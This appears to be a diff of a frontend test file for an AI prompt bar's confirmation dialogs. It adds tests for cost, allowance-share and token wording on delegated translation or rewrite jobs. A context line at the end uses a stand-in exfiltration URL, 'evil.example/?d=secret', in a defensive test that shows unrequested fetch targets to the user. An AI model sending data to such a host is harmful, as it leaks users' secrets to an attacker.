@@ -103,6 +103,40 @@ describe('AIPromptBar: confirmation request', () => {
     expect(answer.mock.calls).toEqual([[false, 'Use the knowledge base']])
   })
 
+  it('a delegated job asks with its cost, share of the allowance and duration: Start / Cancel', async () => {
+    available()
+    const answer = vi.fn(async (_allow: boolean, _note?: string) => {})
+    const request: AiConfirmationRequest = {
+      id: 'c5',
+      tool: 'delegate_rewrite',
+      target: null,
+      expiresAt: Date.now() + 60_000,
+      kind: 'job',
+      job: { mode: 'translate', units: 152, usd: 0.11, minutes: 4.8, allowanceShare: 0.22, targetLanguage: 'English', inputTokens: 600_000, outputTokens: 125_000 }
+    }
+    const wrapper = await mountSuspended(AIPromptBar, { props: { ai: aiProps(request, answer) } })
+    expect(wrapper.find('[data-testid="ai-confirm-panel"]').attributes('data-kind')).toBe('job')
+    expect(wrapper.find('[data-testid="ai-confirm-question"]').text()).toBe('Translate 152 sections to English: about $0.11 (22 % of this month\'s allowance), about 5 min.')
+    expect(wrapper.find('[data-testid="ai-confirm-allow"]').text()).toBe('Start')
+    expect(wrapper.find('[data-testid="ai-confirm-deny"]').text()).toBe('Cancel')
+    await wrapper.find('[data-testid="ai-confirm-allow"]').trigger('click')
+    expect(answer.mock.calls).toEqual([[true]])
+  })
+
+  it('a job on the user\'s own key shows tokens instead of a cost', async () => {
+    available()
+    const request: AiConfirmationRequest = {
+      id: 'c6',
+      tool: 'delegate_rewrite',
+      target: null,
+      expiresAt: Date.now() + 60_000,
+      kind: 'job',
+      job: { mode: 'rewrite', units: 40, usd: null, minutes: 1.2, allowanceShare: null, targetLanguage: null, inputTokens: 100_000, outputTokens: 20_000 }
+    }
+    const wrapper = await mountSuspended(AIPromptBar, { props: { ai: aiProps(request) } })
+    expect(wrapper.find('[data-testid="ai-confirm-question"]').text()).toMatch(/^Rewrite 40 sections: about 120,000 tokens on your own key, about 1 min\.$/)
+  })
+
   it('shows the exact URL for a fetch the user did not type', async () => {
     available()
     const request = { id: 'c2', tool: 'fetch_url', target: 'https://evil.example/?d=secret', expiresAt: Date.now() + 60_000 }
